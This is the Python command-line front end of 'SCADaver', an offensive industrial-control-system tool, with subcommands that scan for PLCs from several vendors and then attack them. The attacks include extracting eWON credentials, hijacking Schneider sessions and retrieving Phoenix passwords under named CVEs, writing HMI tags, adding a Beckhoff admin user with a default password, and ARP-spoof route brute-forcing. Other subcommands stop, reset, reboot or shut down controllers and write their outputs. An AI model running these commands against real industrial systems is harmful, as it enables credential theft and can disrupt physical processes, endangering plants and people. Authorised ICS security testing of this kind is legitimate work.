"""SCADaver CLI — click-based subcommand interface.

Entry point registered as ``scadaver`` console script.
Subcommands are organized by action: ``scan``, ``control``,
``exploit``. Running bare ``scadaver`` launches an interactive menu.
"""

from __future__ import annotations

import sys

import click

from scadaver import __version__


# ===================================================================
# Main group
# ===================================================================

@click.group(invoke_without_command=True)
@click.version_option(__version__, prog_name="scadaver")
@click.pass_context
def main(ctx: click.Context) -> None:
    """SCADaver — Unified ICS Red Team Multi-Tool.

    Consolidates scanning, exploitation, and control of industrial
    control systems across Siemens, Beckhoff, Schneider, Mitsubishi,
    Phoenix Contact, eWON, and EtherNet/IP devices.

    Run a subcommand for direct use, or invoke bare for an
    interactive menu.
    """
    if ctx.invoked_subcommand is None:
        from scadaver.interactive import interactive_menu
        interactive_menu()


# ===================================================================
# scan group
# ===================================================================

@main.group()
def scan() -> None:
    """Discover ICS devices on the network."""


@scan.command("enip")
@click.option("-b", "--broadcast", default="255.255.255.255", help="Broadcast IP")
@click.option("-t", "--timeout", default=5, type=int, help="Timeout in seconds")
def scan_enip(broadcast: str, timeout: int) -> None:
    """Scan for EtherNet/IP (CIP) devices."""
    from scadaver.vendors.enip.scan import scan as do_scan
    devices = do_scan(broadcast_ip=broadcast, timeout=timeout)
    if not devices:
        click.echo("No EtherNet/IP devices found.")
        return
    for d in devices:
        click.echo(
            f"  {d['ip']}:{d['port']} — {d.get('product_name', '?')} "
            f"(vendor={d.get('vendor_name', '?')}, type={d.get('device_type_name', '?')})"
        )


@scan.command("ewon")
@click.option("-t", "--timeout", default=3, type=int, help="Timeout in seconds")
def scan_ewon(timeout: int) -> None:
    """Scan for eWON devices (UDP broadcast)."""
    from scadaver.vendors.ewon.scan import scan as do_scan
    devices = do_scan(timeout=timeout)
    if not devices:
        click.echo("No eWON devices found.")
        return
    for d in devices:
        click.echo(f"  {d.get('ip', '?')} — {d.get('device_name', '?')}")


@scan.command("schneider")
@click.option("-b", "--broadcast", default="255.255.255.255", help="Broadcast IP")
@click.option("-t", "--timeout", default=2, type=int, help="Timeout in seconds")
def scan_schneider(broadcast: str, timeout: int) -> None:
    """Scan for Schneider Electric devices (UDP 1740)."""
    from scadaver.vendors.schneider.scan import scan as do_scan
    devices = do_scan(broadcast_ip=broadcast, timeout=timeout)
    if not devices:
        click.echo("No Schneider devices found.")
        return
    for d in devices:
        click.echo(f"  {d.get('ip', '?')} — {d.get('name', '?')}")


@scan.command("mitsubishi")
@click.option("-b", "--broadcast", default="255.255.255.255", help="Broadcast IP")
@click.option("-t", "--timeout", default=3, type=int, help="Timeout in seconds")
def scan_mitsubishi(broadcast: str, timeout: int) -> None:
    """Scan for Mitsubishi MELSEC devices (UDP 5561)."""
    from scadaver.vendors.mitsubishi.scan import scan as do_scan
    devices = do_scan(broadcast_ip=broadcast, timeout=timeout)
    if not devices:
        click.echo("No Mitsubishi devices found.")
        return
    for d in devices:
        click.echo(f"  {d.get('ip', '?')} — {d.get('model', '?')}")


@scan.command("beckhoff")
@click.option("-b", "--broadcast", default="255.255.255.255", help="Broadcast IP")
@click.option("-t", "--timeout", default=2, type=int, help="Timeout in seconds")
def scan_beckhoff(broadcast: str, timeout: int) -> None:
    """Scan for Beckhoff TwinCAT devices (UDP 48899)."""
    from scadaver.vendors.beckhoff.scan import discover
    devices = discover(broadcast_ip=broadcast, timeout=timeout)
    if not devices:
        click.echo("No Beckhoff devices found.")
        return
    for d in devices:
        click.echo(
            f"  {d.get('ip', '?')} — {d.get('hostname', '?')} "
            f"(TC {d.get('twincat_version', '?')}, "
            f"NetID {d.get('netid', '?')})"
        )


@scan.command("siemens")
@click.option("-i", "--ip", default=None, help="Target IP for single-device scan")
def scan_siemens(ip: str | None) -> None:
    """Scan for Siemens devices (Profinet DCP or IP-based)."""
    if ip:
        from scadaver.vendors.siemens.scan import scan_ip
        dev = scan_ip(ip)
        _print_siemens_device(dev)
    else:
        click.echo("Profinet DCP scan requires pcap and interface selection.")
        click.echo("Use the interactive menu (scadaver) or provide --ip.")


def _print_siemens_device(d: dict) -> None:
    """Print a single Siemens device info dict."""
    click.echo(
        f"  {d.get('ip_address', '?')} — "
        f"{d.get('type_of_station', '?')} "
        f"({d.get('name_of_station', '?')})"
    )
    if d.get("hardware"):
        click.echo(f"    HW: {d['hardware']}, FW: {d.get('firmware', '?')}")
    if d.get("cpu_state"):
        click.echo(f"    CPU: {d['cpu_state']}")
    ports = d.get("open_ports", [])
    if ports:
        click.echo(f"    Ports: {', '.join(str(p) for p in ports)}")


# ===================================================================
# control group
# ===================================================================

@main.group()
def control() -> None:
    """Control ICS device states and I/O."""


@control.command("mitsubishi")
@click.option("-t", "--target", required=True, help="Target IP")
@click.option(
    "-s", "--state",
    type=click.Choice(["run", "stop", "pause"], case_sensitive=False),
    required=True,
    help="Desired PLC state",
)
def control_mitsubishi(target: str, state: str) -> None:
    """Set Mitsubishi PLC to RUN/STOP/PAUSE."""
    from scadaver.vendors.mitsubishi.control import set_state
    result = set_state(target, state.upper())
    click.echo(f"Result: {result}")


@control.command("phoenix")
@click.option("-t", "--target", required=True, help="Target IP")
@click.option(
    "-m", "--model",
    type=click.Choice(["ilc150", "ilc390"], case_sensitive=False),
    required=True,
    help="Controller model",
)
@click.option(
    "-a", "--action",
    type=click.Choice(["cold", "warm", "hot", "stop", "info"], case_sensitive=False),
    required=True,
    help="Action to perform",
)
def control_phoenix(target: str, model: str, action: str) -> None:
    """Control Phoenix Contact PLC (ILC 150/390)."""
    from scadaver.vendors.phoenix.control import (
        control_ilc150,
        control_ilc390,
        get_device_info,
        query_state_ilc150,
        query_state_ilc390,
    )
    if action == "info":
        info = get_device_info(target)
        click.echo(f"Device info: {info}")
        return

    if model == "ilc150":
        if action in ("cold", "warm", "hot", "stop"):
            result = control_ilc150(target, action)
            click.echo(f"ILC 150 {action}: {'OK' if result else 'Failed'}")
    else:
        if action in ("cold", "warm", "hot", "stop"):
            result = control_ilc390(target, action)
            click.echo(f"ILC 390 {action}: {'OK' if result else 'Failed'}")


@control.command("siemens-io")
@click.option("-t", "--target", required=True, help="Target IP")
@click.option("-r", "--read", "do_read", is_flag=True, help="Read I/O state")
@click.option("-o", "--outputs", default=None, help="Binary output string (e.g. 10110000)")
@click.option("-m", "--merkers", default=None, help="Binary merker string,offset (e.g. 01010101,3)")
def control_siemens_io(target: str, do_read: bool, outputs: str | None, merkers: str | None) -> None:
    """Read/write Siemens S7 inputs, outputs, and merkers."""
    from scadaver.vendors.siemens.control import read_io, write_merkers, write_outputs

    if outputs:
        ok = write_outputs(target, outputs)
        click.echo(f"Outputs: {'written' if ok else 'failed'}")
    if merkers:
        parts = merkers.split(",")
        bits = parts[0]
        offset = int(parts[1]) if len(parts) > 1 else 0
        ok = write_merkers(target, bits, offset)
        click.echo(f"Merkers: {'written' if ok else 'failed'}")
    if do_read or (not outputs and not merkers):
        data = read_io(target)
        for area in ("inputs", "outputs", "merkers"):
            bits_dict = data.get(area)
            if bits_dict is None:
                click.echo(f"  {area}: read error")
                continue
            click.echo(f"  {area}:")
            for key in sorted(bits_dict, key=lambda k: (int(k.split(".")[0]), int(k.split(".")[1]))):
                click.echo(f"    {key}: {bits_dict[key]}")


@control.command("siemens-cpu")
@click.option("-t", "--target", required=True, help="Target IP")
@click.option("--flip", is_flag=True, help="Toggle CPU state (run↔stop)")
def control_siemens_cpu(target: str, flip: bool) -> None:
    """Query or toggle Siemens S7 CPU state."""
    from scadaver.vendors.siemens.control import cpu_state, flip_cpu
    click.echo(f"CPU state: {cpu_state(target)}")
    if flip:
        ok = flip_cpu(target)
        click.echo(f"Flip: {'success' if ok else 'failed'}")
        click.echo(f"New state: {cpu_state(target)}")


@control.command("beckhoff-tc")
@click.option("-t", "--target", required=True, help="Target IP")
@click.option(
    "-s", "--state",
    type=click.Choice(["run", "config", "stop", "reset"], case_sensitive=False),
    default=None,
    help="Desired TwinCAT state",
)
@click.option("--reboot", is_flag=True, help="Reboot the device")
@click.option("--shutdown", is_flag=True, help="Shut down the device")
def control_beckhoff_tc(
    target: str,
    state: str | None,
    reboot: bool,
    shutdown: bool,
) -> None:
    """Control Beckhoff TwinCAT state, reboot or shutdown."""
    from scadaver.vendors.beckhoff.scan import (
        get_state,
        reboot_device,
        set_twincat_state,
        shutdown_device,
    )
    if reboot:
        reboot_device(target)
        click.echo("Reboot command sent.")
        return
    if shutdown:
        shutdown_device(target)
        click.echo("Shutdown command sent.")
        return
    if state:
        set_twincat_state(target, state)
        click.echo(f"State change to '{state}' sent.")
    else:
        s = get_state(target)
        click.echo(f"Current state: {s}")


# ===================================================================
# exploit group
# ===================================================================

@main.group()
def exploit() -> None:
    """Run ICS exploitation modules."""


@exploit.command("ewon-creds")
@click.option("-t", "--target", required=True, help="Target eWON IP")
def exploit_ewon_creds(target: str) -> None:
    """Extract credentials from eWON Flexy (auth bypass)."""
    from scadaver.vendors.ewon.exploit import exploit as do_exploit
    do_exploit(target)


@exploit.command("schneider-flash")
@click.option("-t", "--target", required=True, help="Target Schneider IP")
def exploit_schneider_flash(target: str) -> None:
    """Flash LED on a Schneider M340 PLC."""
    from scadaver.vendors.schneider.flash_led import flash_led
    flash_led(target)
    click.echo("Flash LED command sent.")


@exploit.command("schneider-hijack")
@click.option("-t", "--target", required=True, help="Target Schneider IP")
@click.option(
    "-a", "--action",
    type=click.Choice(["info", "run", "stop", "init"], case_sensitive=False),
    default="info",
    help="Action to perform",
)
def exploit_schneider_hijack(target: str, action: str) -> None:
    """CVE-2017-6026: Session hijack on Schneider M340."""
    from scadaver.vendors.schneider.session_hijack import (
        control_plc,
        get_device_info,
        get_session_cookie,
    )
    cookie = get_session_cookie(target)
    if cookie is None:
        click.echo("Failed to get session cookie.")
        return
    click.echo(f"Session cookie: {cookie}")
    if action == "info":
        info = get_device_info(target, cookie)
        click.echo(f"Device info: {info}")
    else:
        result = control_plc(target, cookie, action)
        click.echo(f"Control result: {result}")


@exploit.command("phoenix-passwords")
@click.option("-t", "--target", required=True, help="Target Phoenix IP")
def exploit_phoenix_passwords(target: str) -> None:
    """CVE-2016-8366: Retrieve passwords from Phoenix WebVisit."""
    from scadaver.vendors.phoenix.webvisit import retrieve_passwords
    passwords = retrieve_passwords(target)
    if passwords:
        for user, pwd in passwords:
            click.echo(f"  {user}: {pwd}")
    else:
        click.echo("No passwords retrieved.")


@exploit.command("phoenix-tags")
@click.option("-t", "--target", required=True, help="Target Phoenix IP")
@click.option("--read", "do_read", is_flag=True, help="Read tag values")
@click.option("--write", "tag_write", default=None, help="tag_index=value to write")
def exploit_phoenix_tags(target: str, do_read: bool, tag_write: str | None) -> None:
    """CVE-2016-8380: Read/write HMI tag values on Phoenix PLCs."""
    from scadaver.vendors.phoenix.webvisit import (
        get_tags,
        read_tag_values,
        write_tag_value,
    )
    tags = get_tags(target)
    if not tags:
        click.echo("No tags found.")
        return
    click.echo(f"Found {len(tags)} tags")
    if do_read:
        values = read_tag_values(target, tags)
        for name, val in values.items():
            click.echo(f"  {name}: {val}")
    if tag_write:
        idx_str, value = tag_write.split("=", 1)
        write_tag_value(target, int(idx_str), value)
        click.echo("Tag write sent.")


@exploit.command("beckhoff-reboot")
@click.option("-t", "--target", required=True, help="Target Beckhoff IP")
def exploit_beckhoff_reboot(target: str) -> None:
    """Reboot a Beckhoff CX9020 via UPnP/SOAP."""
    from scadaver.vendors.beckhoff.webcontrol import reboot
    reboot(target)


@exploit.command("beckhoff-user")
@click.option("-t", "--target", required=True, help="Target Beckhoff IP")
@click.option("-u", "--username", default="scadaver_admin", help="Username to create")
@click.option("-p", "--password", default="Sc4d4v3r!", help="Password for new user")
def exploit_beckhoff_user(target: str, username: str, password: str) -> None:
    """Add an admin user to a Beckhoff CX9020 via UPnP/SOAP."""
    from scadaver.vendors.beckhoff.webcontrol import add_user
    add_user(target, username=username, password=password)


@exploit.command("beckhoff-route-spoof")
@click.option("-t", "--target", required=True, help="Target Beckhoff IP")
@click.option("-c", "--cidr", default=None, help="CIDR range to scan (e.g. 192.168.1.0/24)")
def exploit_beckhoff_route_spoof(target: str, cidr: str | None) -> None:
    """Brute-force Beckhoff ADS routes via ARP spoofing (Linux only)."""
    from scadaver.core.network import get_interfaces, select_interface
    from scadaver.vendors.beckhoff.route_spoof import brute_force_routes

    ifaces = get_interfaces()
    iface = select_interface(ifaces)
    result = brute_force_routes(
        adapter_ip=iface.ip,
        adapter_mac=iface.mac.replace(":", ""),
        target_ip=target,
        cidr=cidr,
    )
    if result:
        click.echo(f"Found working IP: {result}")
    else:
        click.echo("No valid route found.")


if __name__ == "__main__":
    main()
